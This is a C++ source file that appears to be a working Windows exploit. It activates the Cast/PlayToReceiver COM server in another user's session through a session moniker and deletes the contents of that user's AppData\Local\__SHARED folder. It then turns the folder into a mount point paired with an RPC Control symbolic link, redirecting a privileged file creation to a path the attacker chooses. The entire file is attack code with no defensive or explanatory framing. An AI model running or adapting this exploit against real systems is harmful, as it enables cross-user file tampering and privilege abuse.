#include <stdio.h>
#include <windows.h>
#include <hstring.h>
#include <cstdio>
#include <cstdlib>
#include <iostream>
#include <string>
#include <string.h>
#include <windows.h>
#include <strsafe.h>
#include <tlhelp32.h>
#include <inspectable.h>
#include <windef.h>
#include <Psapi.h>
#include <winternl.h>
#pragma comment(lib, "ntdll")

#pragma warning(disable:4996);

using namespace std; 

typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    union {
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            ULONG Flags;
            WCHAR PathBuffer[1];
        } SymbolicLinkReparseBuffer;
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR PathBuffer[1];
        } MountPointReparseBuffer;
        struct {
            UCHAR  DataBuffer[1];
        } GenericReparseBuffer;
    } DUMMYUNIONNAME;

} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;

class __declspec(uuid("7733f245-f909-4be2-918f-bddecbcd07cc")) ICastServerControl : public IUnknown {
public:
    virtual HRESULT __stdcall Proc3();
    virtual HRESULT __stdcall Proc4();
    virtual HRESULT __stdcall Proc5(/* Stack Offset: 8 */ void* p0);
    virtual HRESULT __stdcall Proc6(/* Stack Offset: 8 */ void* p0);
    virtual HRESULT __stdcall GetEnableControl(/* Stack Offset: 8 */ int64_t* p0);
    virtual HRESULT __stdcall Proc8(/* Stack Offset: 8 */ int64_t p0);
    virtual HRESULT __stdcall Proc9(/* Stack Offset: 8 */ IUnknown* p0);
};

ICastServerControl* p;

typedef NTSTATUS(WINAPI* NtCreateSymbolicLinkObject_t)(OUT PHANDLE           SymbolicLinkHandle,
    IN ACCESS_MASK        DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PUNICODE_STRING    TargetName);

NtCreateSymbolicLinkObject_t  NtCreateSymbolicLinkObject;
#define DIRECTORY_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0xF)
#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)

void  CreateSymlink(HANDLE hRoot, LPCWSTR SymbolicLinkName, LPCWSTR TargetName) {
    HANDLE SymbolicLinkHandle = NULL;
    UNICODE_STRING TargetObjectName = { 0 };
    OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
    UNICODE_STRING SymbolicLinkObjectName = { 0 };

    LPCSTR nt = "ntdll";
    HMODULE hntdll = GetModuleHandleA(nt);

    NtCreateSymbolicLinkObject = (NtCreateSymbolicLinkObject_t)GetProcAddress(hntdll, "NtCreateSymbolicLinkObject");

    RtlInitUnicodeString(&SymbolicLinkObjectName, SymbolicLinkName);
    RtlInitUnicodeString(&TargetObjectName, TargetName);

    InitializeObjectAttributes(&ObjectAttributes,
        &SymbolicLinkObjectName,
        OBJ_CASE_INSENSITIVE,
        hRoot,
        NULL);

    int NtStatus = NtCreateSymbolicLinkObject(&SymbolicLinkHandle,
        SYMBOLIC_LINK_ALL_ACCESS,
        &ObjectAttributes,
        &TargetObjectName);

    if (NtStatus != 0) {
        printf("\t\t[-] Failed to open object directory: 0x%X\n", NtStatus);
        getchar();
        exit(-1);
    }

}

void TraverseDirectory(wchar_t Dir[MAX_PATH])
{
    WIN32_FIND_DATA FindFileData;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    wchar_t DirSpec[MAX_PATH];
    DWORD dwError;
    StringCchCopy(DirSpec, MAX_PATH, Dir);
    StringCchCat(DirSpec, MAX_PATH, TEXT("\\*"));

    hFind = FindFirstFile(DirSpec, &FindFileData);

    if (hFind == INVALID_HANDLE_VALUE)
    {
        FindClose(hFind);
    }
    else
    {
        while (FindNextFile(hFind, &FindFileData) != 0)
        {
            if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0 && wcscmp(FindFileData.cFileName, L".") == 0 || wcscmp(FindFileData.cFileName, L"..") == 0)        //判断是文件夹&&表示为"."||表示为"."
            {
                continue;
            }
            if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0)
            {

                wchar_t DirAdd[MAX_PATH];
                StringCchCopy(DirAdd, MAX_PATH, Dir);
                StringCchCat(DirAdd, MAX_PATH, TEXT("\\"));
                StringCchCat(DirAdd, MAX_PATH, FindFileData.cFileName);
                TraverseDirectory(DirAdd);
                RemoveDirectoryW(DirAdd);
            }

            if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0)
            {
                WCHAR path[1000] = { 0 };
                wcscpy(path, Dir);
                wcscat(path, L"\\");
                wcscat(path, FindFileData.cFileName);
                DeleteFile(path);
            }
        }
        FindClose(hFind);
    }

    return;
}


int main(int argc, char* argv[]) {

    IBindCtx* pbc;
    ULONG cEaten;
    LPMONIKER pmk;

    CoInitializeEx(NULL, COINIT_MULTITHREADED);

    HRESULT hr = CreateBindCtx(NULL, &pbc);

    if (S_OK == hr) {

        printf("CreateBindCtx ok \n");

        //session:2  This 2 needs to be replaced with the session number represented by another ordinary user login 
        hr = MkParseDisplayName(pbc, L"session:2!new:f8842f8e-dafe-4b37-9d38-4e0714a61149", &cEaten, &pmk);

        if (S_OK == hr) {

            printf("MkParseDisplayName ok \n");

            hr = pmk->BindToObject(pbc, 0, __uuidof(p), (LPVOID*)&p);

            if (S_OK == hr) {

                printf("BindToObject ok \n");

                INT64 test = 0;

                //Trigger the creation of C:\Users\another login username\AppData\Local\__SHARED\PlayToReceiver 
                p->GetEnableControl(&test);

                Sleep(1000);

                //Create a symbolic link 
                CreateSymlink(0, L"\\RPC Control\\PlayToReceiver", L"\\??\\C:\\Users\\ztl2\\test");

                DWORD dw;
                const size_t target_byte_size = 0x18;
                const size_t printname_byte_size = 0;
                const size_t path_buffer_size = 0x24;

                REPARSE_GUID_DATA_BUFFER reparse_buffer = { 0 };

                REPARSE_DATA_BUFFER* buffer = (REPARSE_DATA_BUFFER*)malloc(0x2c);
         
                WCHAR* filepath = (WCHAR*)L"C:\\Users\\ztl2\\AppData\\Local\\__SHARED";

                //Empty the files under C:\Users\another login username\AppData\Local\__SHARED and set it as the mount point 
                TraverseDirectory(filepath);

                HANDLE h = CreateFileW(filepath,
                    GENERIC_READ | (1 ? GENERIC_WRITE : 0),
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    0,
                    OPEN_EXISTING,
                    FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
                    0);


                buffer->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
                buffer->ReparseDataLength = 0x24;
                buffer->Reserved = 0;

                buffer->MountPointReparseBuffer.SubstituteNameOffset = 0;
                buffer->MountPointReparseBuffer.SubstituteNameLength = 0x18;
                buffer->MountPointReparseBuffer.PrintNameOffset = 0x1a;
                buffer->MountPointReparseBuffer.PrintNameLength = 0;

                memcpy(buffer->MountPointReparseBuffer.PathBuffer, L"\\RPC Control", target_byte_size + 2);

                memcpy(buffer->MountPointReparseBuffer.PathBuffer + 0xc + 1, L"", printname_byte_size + 2);

                DeviceIoControl(h, FSCTL_SET_REPARSE_POINT, buffer, 0x2c, 0, 0, &dw, 0);

                CloseHandle(h);

                p->GetEnableControl(&test);

                while (true)
                {
                    WCHAR* file = (WCHAR*)L"C:\\Users\\ztl2\\test";

                    HANDLE hFile = CreateFileW(file,
                        GENERIC_ALL,
                        0,                               
                        NULL,
                        OPEN_EXISTING,                      
                        FILE_FLAG_BACKUP_SEMANTICS,        
                        NULL);

                    //Once the file is created we can open the file and finally we cancel the mount point we created 

                    if (hFile != INVALID_HANDLE_VALUE)
                    {
                        printf("%S open ok \n", file);

                        const size_t target_byte_size = 0x18;
                        const size_t printname_byte_size = 0;
                        const size_t path_buffer_size = 0x24;

                        REPARSE_GUID_DATA_BUFFER reparse_buffer = { 0 };

                        REPARSE_DATA_BUFFER* buffer = (REPARSE_DATA_BUFFER*)malloc(0x2c);

                        HANDLE h = CreateFileW(filepath,
                            GENERIC_READ | (1 ? GENERIC_WRITE : 0),
                            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                            0,
                            OPEN_EXISTING,
                            FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
                            0);

                        reparse_buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;

                        DeviceIoControl(h, FSCTL_DELETE_REPARSE_POINT, &reparse_buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, 0, 0, &dw, 0);

                        CloseHandle(h);
                        CloseHandle(hFile);

                        break;
                    }
                    Sleep(1);
                }
            }
        }
    }

    printf("Complete program \n");

    getchar();

    return 0;
}

